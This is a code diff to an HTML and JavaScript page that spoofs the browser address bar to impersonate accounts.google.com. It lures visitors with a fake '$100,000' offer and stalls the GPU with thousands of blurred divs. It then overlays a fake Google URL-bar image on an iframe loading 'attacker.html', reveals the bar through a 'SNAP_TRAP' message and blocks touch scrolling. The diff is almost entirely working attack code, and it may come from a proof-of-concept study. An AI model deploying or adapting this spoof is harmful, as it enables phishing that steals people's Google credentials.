@@ -15,11 +15,10 @@
         width: 100%;
         height: 200vh;
         background-color: #f8f9fa;
-        font-family: -apple-system, Roboto, sans-serif;
+        font-family: sans-serif;
         scroll-behavior: smooth;
         overflow-x: hidden;
       }
-
       #scroll-bait {
         display: flex;
         flex-direction: column;
@@ -29,31 +28,7 @@
         text-align: center;
         color: #5f6368;
         padding: 20px;
-        box-sizing: border-box;
       }
-
-      .bounce-arrow {
-        font-size: 50px;
-        margin-top: 30px;
-        animation: bounce 2s infinite;
-      }
-
-      @keyframes bounce {
-        0%,
-        20%,
-        50%,
-        80%,
-        100% {
-          transform: translateY(0);
-        }
-        40% {
-          transform: translateY(20px);
-        }
-        60% {
-          transform: translateY(10px);
-        }
-      }
-
       #fake-ui {
         display: none;
         position: fixed;
@@ -64,27 +39,32 @@
         z-index: 99999;
         background: #fff;
       }
-
       #fake-bar {
         position: absolute;
         top: 0;
         left: 0;
         width: 100%;
+        height: 56px;
         object-fit: contain;
-        display: block;
-        border-top: 1px solid #ddd;
+        border-bottom: 1px solid #ddd;
+        z-index: 10;
+        opacity: 0;
+        transition: opacity 0.1s ease-in;
+        pointer-events: none;
       }
-
       #fake-content {
         position: absolute;
         top: 0;
         left: 0;
         width: 100%;
-        height: calc(100vh - 60px);
+        height: 100vh;
         border: none;
+        z-index: 1;
         display: block;
+        transition:
+          top 0.1s ease-in,
+          height 0.1s ease-in;
       }
-
       #gpu-killer {
         position: fixed;
         top: 0;
@@ -98,20 +78,17 @@
   </head>
   <body>
     <div id="scroll-bait">
-      <svg width="48" height="48" viewBox="0 0 24 24" fill="#1a73e8">
-        <path
-          d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
-        />
-      </svg>
-      <h2>Scroll down to see the contents of accounts.google.com</h2>
+      <h2>
+        This is the official Google domain. Want to earn $100,000? Follow these
+        instructions. Please scroll down to the bottom of this page to proceed
+        to accounts.google.com.
+      </h2>
+      <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
     </div>
-
     <div id="gpu-killer"></div>
-
     <div id="fake-ui">
+      <img id="fake-bar" src="urlbar-googleE.jpg" alt="Google Address Bar" />
       <iframe id="fake-content" src="attacker.html"></iframe>
-
-      <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
     </div>
 
     <script>
@@ -119,18 +96,11 @@
 
       function triggerMeltdown() {
         const killerContainer = document.getElementById("gpu-killer");
-
         for (let i = 0; i < 2000; i++) {
           let div = document.createElement("div");
-          div.style.position = "absolute";
-          div.style.width = "200vw";
-          div.style.height = "10vh";
-          div.style.background = "rgba(0,0,0,0.01)";
-          div.style.backdropFilter = "blur(10px) contrast(200%)";
-          div.style.transform = `rotate(${Math.random() * 360}deg)`;
+          div.style.cssText = `position:absolute; width:200vw; height:10vh; background:rgba(0,0,0,0.01); backdrop-filter:blur(10px) contrast(200%); transform:rotate(${Math.random() * 360}deg);`;
           killerContainer.appendChild(div);
         }
-
         let start = Date.now();
         while (Date.now() - start < 400) {}
       }
@@ -140,19 +110,34 @@
         () => {
           if (window.scrollY > 80 && !isSpoofed) {
             isSpoofed = true;
-
-            let fakeUI = document.getElementById("fake-ui");
-            fakeUI.style.display = "block";
+            document.getElementById("fake-ui").style.display = "block";
             triggerMeltdown();
-
             window.scrollTo(0, 0);
-
             setTimeout(() => {
               document.getElementById("gpu-killer").innerHTML = "";
             }, 1000);
           }
         },
         { passive: true },
+      );
+
+      window.addEventListener("message", (e) => {
+        if (e.data === "SNAP_TRAP") {
+          let fakeBar = document.getElementById("fake-bar");
+          let fakeContent = document.getElementById("fake-content");
+          fakeBar.style.opacity = "1";
+          fakeBar.style.pointerEvents = "auto";
+          fakeContent.style.top = "56px";
+          fakeContent.style.height = "calc(100vh - 56px)";
+        }
+      });
+
+      document.getElementById("fake-bar").addEventListener(
+        "touchmove",
+        (e) => {
+          if (isSpoofed) e.preventDefault();
+        },
+        { passive: false },
       );
     </script>
   </body>
